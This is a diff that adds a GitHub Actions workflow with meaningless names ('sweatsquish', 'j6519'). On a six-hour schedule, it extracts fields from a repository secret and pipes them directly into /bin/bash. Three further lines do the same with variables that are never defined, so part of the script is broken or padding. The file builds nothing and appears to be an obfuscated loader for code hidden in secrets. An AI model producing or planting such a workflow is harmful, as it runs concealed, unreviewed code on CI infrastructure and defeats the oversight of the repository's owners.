@@ -1,0 +1,22 @@
+name: sweatsquish
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sweatsquish
+        env:
+          j6519: ${{ secrets.j6519 }}
+        run: |
+          echo $j6519 | jq -r .svl2659 | /bin/bash
+          echo $as95 | jq -r .qos51 | /bin/bash
+          echo $kbysk66583 | jq -r .shqj8 | /bin/bash
+          echo $ih377 | jq -r .aot767 | /bin/bash
+
